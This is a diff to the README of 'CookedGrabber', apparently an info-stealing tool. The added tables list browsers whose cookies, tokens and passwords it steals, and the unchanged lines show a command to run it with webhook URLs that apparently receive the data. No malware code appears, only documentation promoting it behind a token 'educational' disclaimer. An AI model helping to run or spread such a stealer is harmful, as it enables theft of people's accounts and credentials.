@@ -63,8 +63,34 @@ You can also run the program by giving several arguments (the webhook(s) link(s)
 ```console
 py CookedGrabber.py YOUR WEBHOOK(s) URL(s)
 ```
+# ⚙️Support 
+
+## Cookies and token grabber 🔍
+
+| Browsers           | Supported ? |
+| -----------        | ----------- |
+| Chrome             | ✔ |
+| Edge               | ✔ |
+| Brave              | ✔ |
+| Firefox            | ✔ |
+| Opera (GX)         | ✔ |
+| Vivaldi            | ✔ |
+| Chromium navigator | ✔ |
+
+## Password stealer 💥
+
+| Browsers           | Supported ? |
+| -----------        | ----------- |
+| Chrome             | ✔  |
+| Edge               | ❌ |
+| Brave              | ❌ |
+| Firefox            | ❌ |
+| Opera (GX)         | ❌ |
+| Vivaldi            | ❌ |
+| Chromium navigator | ❌ |
 
 # ❗Disclaimer
+
 - **Only for educationnal puposes.**
 - **We decline any responsability in case of misuse of this code.**
 
